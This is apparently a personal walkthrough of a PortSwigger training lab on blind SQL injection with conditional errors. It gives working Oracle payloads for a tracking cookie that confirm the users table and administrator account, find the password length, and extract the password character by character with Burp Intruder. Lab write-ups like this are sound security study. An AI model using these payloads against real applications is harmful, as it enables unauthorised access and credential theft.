# Lab #12 - Blind SQL injection with conditional errors
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

Vulnerable parameter - tracking cookie


**End Goals:**
- Output the administrator password
- Login as the administrator user


**Analysis:**

1) Prove that parameter is vulnerable 

*Note for Burp: **ctrl + u** to convert code*

```SQL
''
```
```SQL
' || (select '') || '
```
-> error 500 that means is not a MySQL Database
```SQL
' || (select '' from dual) || ' 
``` 
-> Oracle Database

```SQL
' || (select '' from sametablename) || ' 
```
-> error sametablename don't exist

2) Confirm that the users table exists in the database
```SQL
' || (select '' from users) || ' 
```
-> error 
```SQL
' || (select '' from users where rownum =1) || ' 
```
-> users table exists

3) Confirm that the administrator user exists in the users table
```SQL
' || (select '' from users where username='administrator') || ' 
```
```SQL
' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 
```
```SQL
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' 
```
-> Internal server error -> administrator user exists
```SQL
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='sameuser') || ' 
```
-> 200 response -> user does not exist in database

4) Determine length of password
```SQL
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1) || ' 
```
-> 500 Internal Server error response at 1 -> length of password is greater than 1
```SQL
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>50) || ' 
```
-> 200 response at 50 -> length of password is less than 50

send request to the BurpSuite Intruder --> Attak type "Sniper" Payload type "Numbers"
```SQL
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || ' 
```
-> 20 characters

5) Output the administrator password

```SQL
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || ' 
```
-> If 200 response at a --> a is not the first character of the password

send request to the BurpSuite Intruder -->  Attak type "Sniper" Payload type Brute forcer
```SQL
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='§a§') || ' 
```
->  ***X*** is the first character of the password

Modify the request on BurpSuite Intruder -->  Attak type "Cluster bomb" first Payload type "Numbers" from 1 to 20 and the second Payload type "Brute forcer"
```SQL
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,§1§,1)='§a§') || ' 
```

->  You can also use the ***script.py*** to get the Password 
